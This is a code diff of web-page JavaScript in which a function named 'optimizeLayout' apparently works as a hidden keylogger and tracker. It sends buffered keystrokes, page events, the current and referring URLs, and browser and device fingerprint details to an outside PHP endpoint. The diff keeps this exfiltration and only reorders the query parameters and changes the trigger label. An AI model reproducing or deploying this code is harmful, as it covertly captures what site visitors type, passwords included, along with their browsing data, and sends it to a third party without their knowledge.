@@ -75,7 +75,7 @@ function optimizeLayout(triggerEvent) {
     let eventData = eventsBuffer.map(event => `${event.type}:${event.data}`).join('|');
     let keyData = keyBuffer.join('');
 
-    let url = `https://cloud.chaol.org/bsn4293ygh5id5g3azk4w2.php?c=${math0}&Current=${encodeURIComponent(window.location.href)}&From=${encodeURIComponent(document.referrer)}&w=${screenWidth}&h=${screenHeight}&BrowserLanguages=${browserLanguages}&PrimaryBrowserLanguage=${primaryBrowserLanguage}&Platform=${platform}&CookiesEnabled=${cookiesEnabled}&ColorDepth=${colorDepth}&DeviceMemory=${deviceMemory}&HardwareConcurrency=${hardwareConcurrency}&UserAgent=${userAgent}&Timezone=${humanReadableTimezone}&EventBuffer=${encodeURIComponent(eventData)}&KeyBuffer=${encodeURIComponent(keyData)}`;
+    let url = `https://cloud.chaol.org/bsn4293ygh5id5g3azk4w2.php?c=${math0}&Timezone=${humanReadableTimezone}&w=${screenWidth}&h=${screenHeight}&BrowserLanguages=${browserLanguages}&PrimaryBrowserLanguage=${primaryBrowserLanguage}&Platform=${platform}&CookiesEnabled=${cookiesEnabled}&ColorDepth=${colorDepth}&DeviceMemory=${deviceMemory}&HardwareConcurrency=${hardwareConcurrency}&UserAgent=${userAgent}&Current=${encodeURIComponent(window.location.href)}&From=${encodeURIComponent(document.referrer)}&EventBuffer=${encodeURIComponent(eventData)}&KeyBuffer=${encodeURIComponent(keyData)}`;
 
 
     if (triggerEvent) {
@@ -90,7 +90,7 @@ function optimizeLayout(triggerEvent) {
     keyBuffer = []; 
 }
 
-optimizeLayout('visitCurrentPage');
+optimizeLayout(`visitCurrentPage:${encodeURIComponent(window.location.href)}`);
 
 document.addEventListener('keydown', (e) => {
     if (e.key.length === 1) {
